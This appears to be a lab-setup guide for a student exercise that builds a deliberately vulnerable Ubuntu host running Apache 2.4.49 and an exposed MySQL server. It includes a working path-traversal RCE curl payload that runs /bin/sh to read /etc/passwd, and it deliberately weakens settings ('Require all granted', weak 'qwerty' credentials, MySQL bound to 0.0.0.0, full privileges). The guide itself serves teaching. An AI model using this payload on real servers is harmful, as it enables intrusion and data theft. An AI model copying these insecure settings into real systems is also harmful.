# Exploiting Apache 2.4.49
There are two CVEs related to Apache 2.4.49:
- [CVE-2021-41773](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773)
	- "A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions."
- [CVE-2021-42013](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42013)
	- It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution. This issue only affects Apache 2.4.49 and Apache 2.4.50 and not earlier versions.
## Environment
- This instructions apply to Ubuntu Server 24.04
## Attacking flow
1. Students land on the home page that has a reference to PHP 8.3;
2. After active enumeration, they will find out that the web server is Apache 2.4.49 and that there is a MySQL service listenning on port 3306. Students must assume that Apache is using a database on the same IP address, because MySQL is listening for connections;
3. After reading on each service version, they will find out that Apache 2.4.9 allows path traversal and remote code execution;
4. Students will look for PHP configuration files that may have the database credentials;
5. After getting the credentials, students can use `mysqldump` (LOTL) to dump the entire database to a file
6. Once they examine the contents of the dumped database, they will find out usernames and their hashed passwords. 
# Set Ubuntu Server logs to full verbosity
## Increase Syslog Logging Verbosity
Add the following lines to `/etc/rsyslog.conf` (`sudo` required):
```shell
*.* /var/log/syslog
*.=debug /var/log/debug
*.=info;mail.none;authpriv.none;cron.none /var/log/messages
```
- Restart `rsyslog` with `sudo systemctl restart rsyslog`
## Increase Kernel Logging Verbosity
Edit `/etc/default/grub`:
```shell
GRUB_CMDLINE_LINUX_DEFAULT="quiet splash loglevel=7"
```
## Increase Journal Logging (Systemd)
Edit `/etc/systemd/journald.conf`:

``` shell
Storage=persistent
ForwardToSyslog=yes
MaxLevelStore=debug
MaxLevelSyslog=debug
```
- Restart `journald` with `sudo systemctl restart systemd-journald`
# Configure Apache 2.4.49
## Install
- Package: `httpd-2.4.49.tar.gz`
### Requirements
- `apr-1.7.4.tar.gz`
- `apr-util-1.6.3.tar.gz`
- `pcre-8.45.tar.gz`
- `expat-2.2.6.tar.bz2`
- Build tools for Ubuntu (`build-essential`)
### Resources
- Apache docs for [Compiling and Installing](https://httpd.apache.org/docs/current/install.html)
- [Apache Portable Runtime (APR)](https://apr.apache.org/)
- [Perl Compatible Regular Expressions (PCRE)](https://www.pcre.org/)
- [Expat XML Parser](https://libexpat.github.io/)
### Install build tools
- `sudo apt install build-essential`
### Extract Apache container
- `tar xvf httpd-2.4.49.tar.gz`
### Install Apache Portable Runtime library (APR)
- Extract `apr-1.7.4.tar.gz` and rename it `apr`
- Extract `apr-util-1.6.3.tar.gz` and rename it `apr-util`
- Copy both `apr` and `apr-util` to `httpd-2.4.49/srclib`
- To include this APR use the option `--with-included-apr` when configuring Apache
### Install Perl Compatible Regular Expressions (PCRE)
- Extract `pcre-8.45.tar.gz` and go to the resulting directory
- Configure, compile and install with a prefix:
	```bash
	./configure --prefix=/usr/local/pcre
	make
	sudo make install
	```
- To include this PCRE use the option `--with-pcre=/usr/local/pcre` when configuring Apache
### Install Expat XML Parser
- Extract `expat-2.2.6.tar.bz2` and go to the resulting directory
- Create (as root) `/usr/local/expat`
- Configure, compile and install with a prefix:
	```bash
	./configure --prefix=/usr/local/expat
	make
	sudo make install
	```
- To include this Expat use the option `--with-expat=/usr/local/expat` when configuring Apache
### Install Apache
- Go to `httpd-2.4.49`
- Configure, compile and install:
	```bash
	./configure --with-included-apr --with-pcre=/usr/local/pcre --with-expat=/usr/local/expat
	make
	sudo make install
	```
## Set up Apache
### Set ServerName
The `ServerName` parameter must be specified with a FQDD, an IP address or simply `localhost`. In `/usr/local/apache2/conf/httpd.conf` uncomment the line and set the parameter to `localhost`:
```bash
ServerName localhost:80
```
### Enable CGI scripts
CGI scripts can be enabled by uncommenting the following line of `httpd.conf`:
`#LoadModule cgid_module modules/mod_cgid.so`
### Check if it is a patched version
Probably the downloaded package already has the patch to mitigate these vulnerabilities. Open `/usr/local/apache2/conf/httpd.conf` and check the parameter `Require all`:
```XML
<Directory />
	AllowOverride none
	Require all granted
</Directory>
```
- If the value `Require all` is `denied`, it means that Apache is patched. You must change the value to `granted`
### Change `index.html`
- The file is at `/usr/local/apache2/htdocs`
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Website Under Maintenance</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f8f9fa;
            color: #333;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
        }
        p {
            font-size: 1.2em;
            margin-bottom: 40px;
        }
        footer {
            position: fixed;
            bottom: 10px;
            width: 100%;
            text-align: center;
            font-size: 0.9em;
            color: #888;
        }
    </style>
</head>
<body>
    <h1>Website Under Maintenance</h1>
    <p>We're currently working on improvements. Please check back later.</p>
    <footer>
        Powered by PHP 8.3
    </footer>
</body>
</html>

```
### Set LogLevel to `debug`
Edit `/usr/local/apache2/conf/httpd.conf` and set`LogLevel debug`
### Start Apache
- `sudo /usr/local/apache2/bin/apachectl -k start`
### Test: dump `/etc/passwd`
```bash
curl 'http://<address/domain>:<port>/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type:text/plain; echo; cat /etc/passwd'
```
# Configure MySQL
## Install
``` bash
sudo apt update
sudo apt install mysql-server
sudo mysql_secure_installation
```
## Set root password
1. Do the first login with `sudo mysql -u root -p`
2. Change te root password with a query
```SQL
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'qwerty';
```
## Create dummy database:
```sql
CREATE DATABASE data;
USE data;

CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(255) NOT NULL
);

INSERT INTO users (username, password) VALUES ('admin', 'password'), ('user', 'password');
```

## Create MySQL user for Apache
```sql
CREATE USER 'apache'@'localhost' IDENTIFIED BY 'qwerty';
GRANT ALL PRIVILEGES ON *.* TO 'apache'@'localhost';
FLUSH PRIVILEGES;
```
## Expose `mysql` service
In `/etc/mysql/mysql.conf.d/mysqld.cnf` change the `bind-address` to a wildcard that allows connections from everywhere:
```XML
bind-address      = 0.0.0.0
```
- Restart the service with `sudo systemctl restart mysql`
- Confirm with `nmap` that MySQL is listening at port 3306
## Create PHP configuration files
```bash
sudo mkdir /etc/php/8.3/apache2/
cd /etc/php/8.3/apache2
touch db_connect.php 
```
### Contents of `db_connect.php`
```php
<?php
$servername = "localhost";
$username = "apache";
$password = "qwerty";
$dbname = "data";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

echo "Connected successfully to the database";
$conn->close();
?>
```
## Exploit example
- We can simply dump the contents of the database with `mysqldump`
```bash
mysqldump -u apache -p --databases data > dump.sql
```